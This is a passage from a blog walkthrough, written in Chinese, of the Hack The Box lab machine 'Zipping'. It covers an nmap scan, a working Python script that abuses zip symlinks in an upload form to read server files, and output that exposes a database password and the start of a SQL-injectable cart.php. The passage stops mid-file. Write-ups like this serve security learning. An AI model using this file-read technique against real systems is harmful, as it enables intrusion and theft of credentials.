<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>HTB: Zipping | Lavande&#39;s Blog</title>
  <meta name="author" content="Lavande">
  
  <meta name="description" content="IP:10.10.11.229
nmap结果
12345678910111213141516# Nmap 7.92 scan initiated Sat Nov 25 06:21:37 2023 as: nmap -sC -sV --min-rate 10000 -oN nmap 10.10.11.229Nmap scan report for 10.10.11.229Host is up (0.42s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))|_http-title: Zipping | Watch store|_http-server-header: Apache/2.4.54 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Nov 25 06:22:01 2023 -- 1 IP address (1 host up) scanned in 24.12 seconds

WORK WITH US界面存在上传功能

从描述中可以看出，上传的文件必须是pdf经过zip压缩后的压缩文件
测试文件

12345678910111213141516171819202122232425262728293031323334┌──(kali㉿kali)-[~/htb/Zipping]└─$ 7z -l test.zip7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 5600X 6-Core Processor              (A20F10),ASM,AES-NI)Command Line Error:Unsupported command:test.zip                                                                                                                                                                                                                  ┌──(kali㉿kali)-[~/htb/Zipping]└─$ 7z l test.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 5600X 6-Core Processor              (A20F10),ASM,AES-NI)Scanning the drive for archives:1 file, 198 bytes (1 KiB)Listing archive: test.zip--Path = test.zipType = zipPhysical Size = 198   Date      Time    Attr         Size   Compressed  Name------------------- ----- ------------ ------------  ------------------------2023-09-02 05:10:18 .....           32           32  test.pdf------------------- ----- ------------ ------------  ------------------------2023-09-02 05:10:18                 32           32  1 files"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="HTB: Zipping"/>
  <meta property="og:site_name" content="Lavande&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Lavande&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.1.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Lavande&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> HTB: Zipping</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/../images/image-20231125192400721.png" alt="image-20231125192400721"></p>
<p>IP:10.10.11.229</p>
<p>nmap结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92 scan initiated Sat Nov 25 06:21:37 2023 as: nmap -sC -sV --min-rate 10000 -oN nmap 10.10.11.229</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.229</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)</span><br><span class="line">|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))</span><br><span class="line">|_http-title: Zipping | Watch store</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sat Nov 25 06:22:01 2023 -- 1 IP address (1 host up) scanned in 24.12 seconds</span></span><br></pre></td></tr></table></figure>

<p>WORK WITH US界面存在上传功能</p>
<p><img src="/../images/image-20231125192759468.png" alt="image-20231125192759468"></p>
<p>从描述中可以看出，上传的文件必须是pdf经过zip压缩后的压缩文件</p>
<p>测试文件</p>
<p><img src="/../images/image-20231125193542574.png" alt="image-20231125193542574"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Zipping]</span><br><span class="line">└─$ 7z -l test.zip</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 5600X 6-Core Processor              (A20F10),ASM,AES-NI)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command Line Error:</span><br><span class="line">Unsupported <span class="built_in">command</span>:</span><br><span class="line">test.zip</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/htb/Zipping]</span><br><span class="line">└─$ 7z l test.zip </span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 5600X 6-Core Processor              (A20F10),ASM,AES-NI)</span><br><span class="line"></span><br><span class="line">Scanning the drive <span class="keyword">for</span> archives:</span><br><span class="line">1 file, 198 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Listing archive: test.zip</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">Path = test.zip</span><br><span class="line">Type = zip</span><br><span class="line">Physical Size = 198</span><br><span class="line"></span><br><span class="line">   Date      Time    Attr         Size   Compressed  Name</span><br><span class="line">------------------- ----- ------------ ------------  ------------------------</span><br><span class="line">2023-09-02 05:10:18 .....           32           32  test.pdf</span><br><span class="line">------------------- ----- ------------ ------------  ------------------------</span><br><span class="line">2023-09-02 05:10:18                 32           32  1 files</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231125193632361.png" alt="image-20231125193632361"></p>
<p>test.pdf文件内容</p>
<p><img src="/../images/image-20231125193723627.png" alt="image-20231125193723627"></p>
<p>先找出upload.php的源码</p>
<p><img src="/../images/image-20231125200917611.png" alt="image-20231125200917611"></p>
<p>LFI.py读取文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;tmp&quot;</span>):</span><br><span class="line">    shutil.rmtree(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;sym.zip&quot;</span>):</span><br><span class="line">    os.remove(<span class="string">&quot;sym.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;symlink.pdf&quot;</span>):</span><br><span class="line">    os.remove(<span class="string">&quot;symlink.pdf&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;tmp&quot;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">file_to_read = <span class="built_in">input</span>(<span class="string">&quot;File to read: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Creating symlink..&quot;</span>)</span><br><span class="line">os.chdir(<span class="string">&quot;tmp/&quot;</span>)</span><br><span class="line">os.system(<span class="string">f&quot;ln -s <span class="subst">&#123;file_to_read&#125;</span> symlink.pdf&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Zipping..&quot;</span>)</span><br><span class="line">os.system(<span class="string">f&quot;zip -r --symlinks sym.zip symlink.pdf&quot;</span>)</span><br><span class="line">os.system(<span class="string">f&quot;rm symlink.pdf &amp;&amp; cp sym.zip ../&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done! Zip file: sym.zip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Uploading file..&quot;</span>)</span><br><span class="line">MIP = <span class="string">&quot;10.10.11.229&quot;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;zipFile&#x27;</span>: (<span class="string">&#x27;sym.zip&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;sym.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>),<span class="string">&#x27;application/zip&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: (<span class="literal">None</span>,<span class="string">&#x27;&#x27;</span>)         </span><br><span class="line">       &#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;Host&quot;</span>:MIP,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span>&#125;</span><br><span class="line">s  = requests.Session()</span><br><span class="line">r = s.get(<span class="string">f&quot;http://<span class="subst">&#123;MIP&#125;</span>&quot;</span>,headers=headers)</span><br><span class="line">r = s.get(<span class="string">f&quot;http://<span class="subst">&#123;MIP&#125;</span>/upload.php&quot;</span>, headers=headers)</span><br><span class="line">r = s.post(<span class="string">f&quot;http://<span class="subst">&#123;MIP&#125;</span>/upload.php&quot;</span>,files=file,headers=headers)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(r.text,features=<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line">uuid=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> soup.find_all(<span class="string">&quot;a&quot;</span>,href=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;uploads&quot;</span> <span class="keyword">in</span> a[<span class="string">&#x27;href&#x27;</span>]:</span><br><span class="line">                                uuid = a[<span class="string">&#x27;href&#x27;</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;File UUID: &quot;</span>,uuid)</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;\nReading file..&quot;</span>)</span><br><span class="line">                                r = s.get(<span class="string">f&quot;http://<span class="subst">&#123;MIP&#125;</span>/uploads/<span class="subst">&#123;uuid&#125;</span>/symlink.pdf&quot;</span>)</span><br><span class="line">                                <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231125202327633.png" alt="image-20231125202327633"></p>
<p>index.php</p>
<p><img src="/../images/image-20231125203112299.png" alt="image-20231125203112299"></p>
<p>functions.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Zipping]</span><br><span class="line">└─$ python3 ex.py</span><br><span class="line">File to read: /<span class="keyword">var</span>/www/html/shop/functions.php    </span><br><span class="line">Creating symlink..</span><br><span class="line">Zipping..</span><br><span class="line">  adding: symlink.<span class="title function_ invoke__">pdf</span> (stored <span class="number">0</span>%)</span><br><span class="line">Done! Zip file: sym.zip</span><br><span class="line">Uploading file..</span><br><span class="line">File UUID:  <span class="number">0054287564</span>aa5d7a87e86fbe8bad8b22</span><br><span class="line"></span><br><span class="line">Reading file..</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_connect_mysql</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Update the details below with your MySQL details</span></span><br><span class="line">    <span class="variable">$DATABASE_HOST</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_USER</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_PASS</span> = <span class="string">&#x27;MySQL_P@ssw0rd!&#x27;</span>;</span><br><span class="line">    <span class="variable">$DATABASE_NAME</span> = <span class="string">&#x27;zipping&#x27;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=&#x27;</span> . <span class="variable">$DATABASE_HOST</span> . <span class="string">&#x27;;dbname=&#x27;</span> . <span class="variable">$DATABASE_NAME</span> . <span class="string">&#x27;;charset=utf8&#x27;</span>, <span class="variable">$DATABASE_USER</span>, <span class="variable">$DATABASE_PASS</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$exception</span>) &#123;</span><br><span class="line">        <span class="comment">// If there is an error with the connection, stop the script and display the error.</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;Failed to connect to database!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Template header, feel free to customize this</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_header</span>(<span class="params"><span class="variable">$title</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$num_items_in_cart</span> = <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) ? <span class="title function_ invoke__">count</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cart&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;<span class="subst">$title</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">                &lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;header&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;content-wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;nav&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/nav&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;link-icons&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;index.php?page=cart&quot;&gt;</span></span><br><span class="line"><span class="string">                                                &lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="string">                                                &lt;span&gt;<span class="subst">$num_items_in_cart</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                        &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/header&gt;</span></span><br><span class="line"><span class="string">        &lt;main&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Template footer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_footer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$year</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">        &lt;/main&gt;</span></span><br><span class="line"><span class="string">        &lt;footer&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;content-wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; <span class="subst">$year</span>, Zipping Watch Store&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/footer&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cart.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Zipping]</span><br><span class="line">└─$ python3 ex.py</span><br><span class="line">File to read: /<span class="keyword">var</span>/www/html/shop/cart.php</span><br><span class="line">Creating symlink..</span><br><span class="line">Zipping..</span><br><span class="line">  adding: symlink.<span class="title function_ invoke__">pdf</span> (stored <span class="number">0</span>%)</span><br><span class="line">Done! Zip file: sym.zip</span><br><span class="line">Uploading file..</span><br><span class="line">File UUID:  <span class="number">700e6918</span>e8255c291df62d6a30a4cca0</span><br><span class="line"></span><br><span class="line">Reading file..</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// If the user clicked the add to cart button on the product page we can check for the form data</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;quantity&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Set the post variables so we easily identify them, also make sure they are integer</span></span><br><span class="line">    <span class="variable">$product_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$quantity</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;quantity&#x27;</span>];</span><br><span class="line">    <span class="comment">// Filtering user input for letters or special characters</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;</span>, <span class="variable">$product_id</span>, <span class="variable">$match</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]/i&quot;</span>, <span class="variable">$quantity</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Construct the SQL statement with a vulnerable parameter</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM products WHERE id = &#x27;&quot;</span> . <span class="variable">$_POST</span>[<span 